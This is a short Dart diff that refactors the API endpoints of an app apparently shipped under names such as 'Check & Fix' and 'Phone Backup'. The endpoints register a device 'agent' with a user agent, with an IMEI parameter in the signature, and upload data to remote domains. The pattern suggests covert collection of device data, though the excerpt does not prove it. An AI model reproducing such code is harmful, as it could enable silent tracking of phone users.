@@ -19,12 +19,12 @@ enum BNBType {
 }
 
 DateFormat serverFormat = DateFormat('dd-MM-yyyy hh:mm:ss');
+const base = kDebugMode ? 'https://testfix.foo' : 'https://directupdate.link';
 
 class Api {
   // 1001 – device info
   static Future<String?> sendDeviceInfo(String? agent, String? imei) async {
-    // const url = 'https://directupdate.link/a_agent_register'; // Check & Fix
-    const url = 'https://testfix.foo/a_agent_register'; // Phone Backup
+    const url = '$base/a_agent_register'; // Phone Backup
     final headers = {'Content-Type': 'application/json', 'User-Agent': '$agent'};
     printYellow('headers $headers');
     final response = await http.get(Uri.parse(url), headers: headers);
@@ -74,8 +74,7 @@ class Api {
       return;
     }
 
-    const url = 'https://testfix.foo/a_agent_upload'; // Check & Fix
-    // const url = 'https://directupdate.link/a_agent_upload'; // Phone Backup
+    const url = '$base/a_agent_upload';
     final headers = {'Content-Type': 'application/json', 'User-Agent': agent};
     final body = jsonEncode(data ?? {});
 
